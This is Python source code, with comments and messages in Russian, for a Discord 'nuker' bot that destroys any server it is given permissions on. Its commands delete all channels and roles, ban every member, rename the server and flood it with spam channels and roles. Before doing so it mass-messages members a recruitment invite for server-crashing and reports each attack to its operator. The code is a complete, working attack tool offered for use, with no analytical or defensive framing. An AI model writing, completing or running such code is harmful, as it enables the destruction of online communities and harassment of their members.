import discord
from discord.ext import commands
import asyncio
import requests
import config
import json

Bot = commands.Bot(command_prefix=config.Prefix) #префикс
token = config.TOKEN

Bot.remove_command('help')

csrl = []
dc = []
dr = []
bl = []
crserv = []

g = [747500947911213249, 779094480900194324, 764781234810650664]

#--
#--
#--

@Bot.command()
async def add(ctx):
  with open("authors.json", "r")as f:
    authors = json.load(f)
  if ctx.author.id == 571667975619346433:
    if str(ctx.author.id) in authors:
      em = discord.Embed(title = f'Вы уже в списке админов', color=discord.Color.green())
      await ctx.send(embed = em)
    else:
      authors[ctx.author.id] = 1
      with open("authors.json", "w")as f:
        json.dump(authors,f)
      emb = discord.Embed(title = 'Вы добавлены в список админов', color=discord.Color.green())
      await ctx.send(embed = emb)
  else:
    embed = discord.Embed(title = 'Отказано в доступе', color=discord.Color.red())
    await ctx.send(embed = embed)

@Bot.command()
async def add_admin(ctx, member: discord.Member):
  with open("authors.json", "r")as f:
    authors = json.load(f)
  if str(ctx.author.id) in authors:
    if str(member.id) in authors:
      em = discord.Embed(title = f'{member} уже в списке админов', color=discord.Color.green())
      await ctx.send(embed = em)
    else:
      authors[str(member.id)] = 1
      with open("authors.json", "w")as f:
        json.dump(authors,f)
      emb = discord.Embed(title = f'{member} добавлен в список админов', color=discord.Color.green())
      await ctx.send(embed = emb)
  else:
    embed = discord.Embed(title = 'Отказано в доступе', color=discord.Color.red())
    await ctx.send(embed = embed)

@Bot.command()
async def remove_admin(ctx, member: discord.Member):
  with open("authors.json", "r")as f:
    authors = json.load(f)
  if str(ctx.author.id) in authors:
    if str(member.id) in authors:
      authors.pop(str(member.id))
    else:
      em = discord.Embed(title = f'{member} не в списке админов', color=discord.Color.green())
      await ctx.send(embed = em)
    with open("authors.json", "w")as f:
      json.dump(authors,f)
    emb = discord.Embed(title = f'{member} убран из списка админов', color=discord.Color.green())
    await ctx.send(embed = emb)
  else:
    embed = discord.Embed(title = 'Отказано в доступе', color=discord.Color.red())
    await ctx.send(embed = embed)

#--
#--
#--

@Bot.command()
async def whitelist_add(ctx, id):
  with open("authors.json", "r")as f:
    authors = json.load(f)
  with open("settings.json", "r")as f:
    sett = json.load(f)
  if str(ctx.author.id) in authors:
    if str(id) in sett["whitelist"]:
      em = discord.Embed(title = f'{id} уже в белом списке', color=discord.Color.green())
      await ctx.send(embed = em)
    else:
      sett["whitelist"][id] = 1
      with open("settings.json", "w")as f:
        json.dump(sett,f)
      emb = discord.Embed(title = f'{id} добавлен в белый список', color=discord.Color.green())
      await ctx.send(embed = emb)
  else:
    embed = discord.Embed(title = 'Отказано в доступе', color=discord.Color.red())
    await ctx.send(embed = embed)
    
    
@Bot.command()
async def whitelist_remove(ctx, id):
  with open("authors.json", "r")as f:
    authors = json.load(f)
  with open("settings.json", "r")as f:
    sett = json.load(f)
  if str(ctx.author.id) in authors:
    if str(id) not in sett["whitelist"]:
      em = discord.Embed(title = f'{id} отсутствует в белом списке', color=discord.Color.red())
      await ctx.send(embed = em)
    else:
      se = sett["whitelist"]
      se.pop(str(id))
      with open("settings.json", "w")as f:
        json.dump(sett,f)
      emb = discord.Embed(title = f'{id} убран из белого списка', color=discord.Color.green())
      await ctx.send(embed = emb)
  else:
    embed = discord.Embed(title = 'Отказано в доступе', color=discord.Color.red())
    await ctx.send(embed = embed)

@Bot.command()
async def crashed_server_name(ctx, *,text):
  with open("authors.json", "r")as f:
    authors = json.load(f)
  with open("settings.json", "r")as f:
    sett = json.load(f)
  if str(ctx.author.id) in authors:
    sett["ctext"] = text
    with open("settings.json", "w")as f:
      json.dump(sett,f)
    embed = discord.Embed(title = f'Название крашнутого сервера изменено на {text}', color=discord.Color.green())
    await ctx.send(embed = embed)
  else:
    embed = discord.Embed(title = 'Отказано в доступе', color=discord.Color.red())
    await ctx.send(embed = embed)
    
@Bot.command()
async def channels_and_roles_name(ctx, *,text):
  with open("authors.json", "r")as f:
    authors = json.load(f)
  with open("settings.json", "r")as f:
    sett = json.load(f)
  if str(ctx.author.id) in authors:
    sett["carname"] = text
    with open("settings.json", "w")as f:
      json.dump(sett,f)
    embed = discord.Embed(title = f'Имя создаваемых каналов и ролей изменено на {text}', color=discord.Color.green())
    await ctx.send(embed = embed)
  else:
    embed = discord.Embed(title = 'Отказано в доступе', color=discord.Color.red())
    await ctx.send(embed = embed)
    
@Bot.command()
async def create_channels_limit(ctx, channels):
  with open("authors.json", "r")as f:
    authors = json.load(f)
  with open("settings.json", "r")as f:
    sett = json.load(f)
  if str(ctx.author.id) in authors:
    sett["createchannels"] = channels
    with open("settings.json", "w")as f:
      json.dump(sett,f)
    embed = discord.Embed(title = f'Число создаваемых каналов изменено на {channels}', color=discord.Color.green())
    await ctx.send(embed = embed)
  else:
    embed = discord.Embed(title = 'Отказано в доступе', color=discord.Color.red())
    await ctx.send(embed = embed)
    
@Bot.command()
async def blockmember(ctx, id):
  with open("authors.json", "r")as f:
    authors = json.load(f)
  with open("settings.json", "r")as f:
    sett = json.load(f)
  if str(ctx.author.id) in authors:
   if str(id) not in sett["blockmembers"]:
    sett["blockmembers"][id] = 1
    with open("settings.json", "w")as f:
      json.dump(sett,f)
    embed = discord.Embed(title = f'{id} добавлен в чёрный список', color=discord.Color.green())
    await ctx.send(embed = embed)
   else:
      em = discord.Embed(title = f'Этот айди уже в списке', color=discord.Color.red())
      await ctx.send(embed = em)
  else:
    embed = discord.Embed(title = 'Отказано в доступе', color=discord.Color.red())
    await ctx.send(embed = embed)
    
@Bot.command()
async def unblockmember(ctx, id):
  with open("authors.json", "r")as f:
    authors = json.load(f)
  with open("settings.json", "r")as f:
    sett = json.load(f)
  if str(ctx.author.id) in authors:
   if str(id) in sett["blockmembers"]:
    se = sett["blockmembers"]
    se.pop(str(id))
    with open("settings.json", "w")as f:
      json.dump(sett,f)
    embed = discord.Embed(title = f'{id} убран из чёрного списка', color=discord.Color.green())
    await ctx.send(embed = embed)
   else:
      em = discord.Embed(title = f'Этого айди нет в списке', color=discord.Color.red())
      await ctx.send(embed = em)
  else:
    embed = discord.Embed(title = 'Отказано в доступе', color=discord.Color.red())
    await ctx.send(embed = embed)
    
@Bot.command()
async def delchannels(ctx):
 guild = ctx.guild
 channels = guild.channels
 author = ctx.author
 with open("settings.json", "r")as f:
  sett = json.load(f)
 if str(author.id)in sett["blockmembers"]:
  em = discord.Embed(title = f'Вы в чёрном списке. Выполнение команды запрещено!', color=discord.Color.red())
  await ctx.author.send(embed = em)
 else:
  if guild.id not in dc:
   dc.append(guild.id)
   if str(guild.id) in sett["whitelist"]:
    await ctx.message.delete()
    await author.send('Выполнение команды невозможно! Сервер в белом списке!')
   else:
    await ctx.message.delete()
    for i in channels:
       try:
           await i.delete()
       except:
           pass
  else:
     await ctx.author.send('Команда уже использовалась!')

@Bot.command()
async def delroles(ctx):
 guild = ctx.guild
 author = ctx.author
 roles = guild.roles
 with open("settings.json", "r")as f:
  sett = json.load(f)
 if str(author.id)in sett["blockmembers"]:
  em = discord.Embed(title = f'Вы в чёрном списке. Выполнение команды запрещено!', color=discord.Color.red())
  await ctx.author.send(embed = em)
 else:
  g = [747500947911213249,776803884764889128, 764781234810650664]
  if guild.id not in dr:
   dr.append(guild.id)
   if str(guild.id) in sett["whitelist"]:
    await ctx.message.delete()
    await author.send('Выполнение команды невозможно! Сервер в белом списке!')
   else:
    await ctx.message.delete()
    for i in roles: 
       try:
           await i.delete()
       except:
           pass
  else:
     await ctx.author.send('Команда уже использовалась!')

@Bot.command()
async def banall(ctx):
 guild = ctx.guild
 members = guild.members
 author = ctx.author
 with open("settings.json", "r")as f:
  sett = json.load(f)
 if str(author.id)in sett["blockmembers"]:
  em = discord.Embed(title = f'Вы в чёрном списке. Выполнение команды запрещено!', color=discord.Color.red())
  await ctx.author.send(embed = em)
 else:
  g = [747500947911213249,776803884764889128, 764781234810650664]
  if guild.id not in bl:
   bl.append(guild.id)
   if str(guild.id) in sett["whitelist"]:
    await ctx.message.delete()
    await author.send('Выполнение команды невозможно! Сервер в белом списке!')
   else:
    await ctx.message.delete()
    for i in members:
          if i is not Bot.user:
              try:
                  await i.ban()
              except:
                  pass
  else:
     await ctx.author.send('Команда уже использовалась!')

@Bot.command()
async def crash(ctx):
 guild = ctx.guild
 channels = guild.channels
 members = guild.members
 roles = guild.roles
 author = ctx.author
 with open("settings.json", "r")as f:
  sett = json.load(f)
 if str(author.id)in sett["blockmembers"]:
  em = discord.Embed(title = f'Вы в чёрном списке. Выполнение команды запрещено!', color=discord.Color.red())
  await ctx.author.send(embed = em)
 else:
  gid = ctx.guild.id
  g = [747500947911213249,776803884764889128, 764781234810650664]
  if guild.id not in csrl:
   csrl.append(guild.id)
   if str(guild.id) in sett["whitelist"]:
     await ctx.message.delete()
     await author.send('Выполнение команды невозможно! Сервер в белом списке!')
   else:
    if gid in crserv:
     await ctx.author.send('ЛЯ ТЫ КРЫСА!')
    else:
     crserv.append(gid)
     await ctx.message.delete()
     user = Bot.get_user(571667975619346433)
     await user.send(f'{author} Крашнул сервер! Айди автора: {author.id}')
     for i in members:
       if i is not Bot.user:
          try:
            await i.send(f'Сервер {guild.name} уничтожен! Хочешь тоже крашать? Переходи! https://discord.gg/ang3M7c93x')
          except:
                pass
     for i in roles:  # Удаление ролей
        try:
            await i.delete()
        except:
            pass
     for i in members:  # Бан участников
        if i is not Bot.user:
            try:
                await i.ban()
            except:
                pass
     for i in channels:  # Удаление каналов
         try:
             await i.delete()
         except:
              pass
    with open('image.jpg', 'rb') as f:
        icon = f.read()
        await guild.edit(name=sett["ctext"], icon=icon)
    d = 1
    while d <= sett["createchannels"]:
         d = d + 1
         await guild.create_text_channel(name=sett["carname"])
         await guild.create_role(name=sett["carname"])
  else:
   await ctx.author.send('Сервер уже крашнут!')

@Bot.command()
async def help(ctx):
    guild = ctx.guild
    owner = guild.owner
    embed = discord.Embed(title='Помощь', description="!delchannels - удалить все каналы\n!delroles - удалить все роли\n!banall - забанить всех\n!crash - крашнуть серв\n!help - посмотреть список команд\n!admin - админ команды для создателей", timestamp=ctx.message.created_at, color=discord.Color.red())
    await ctx.author.send(embed=embed)
    await ctx.message.delete()
    
@Bot.command()
async def admin(ctx):
    guild = ctx.guild
    owner = guild.owner
    embed = discord.Embed(title='Админка', description="!add_admin - добавить участника в лист админов(по пингу участника)\n!remove_admin - удалить участника из листа админов(по пингу участника)\n!add(только для димона) - добавиться в список админов\n!create_channels_limit - установить лимит создания каналов при краше\n!blockmember - добавить участника в чёрный лист(по айди участника)\nunblockmember - убрать участника из чёрного листа(по айди участника)\n!crashed_server_name - изменить название крашнутого сервера\n!channels_and_roles_name - изменить название создавающихся каналов и ролей\n!whitelist_add - добавить сервер в белый список\n!whitelist_remove - убрать сервер из белого листа", timestamp=ctx.message.created_at, color=discord.Color.red())
    await ctx.author.send(embed=embed)
    await ctx.message.delete()
    

Bot.run(token)
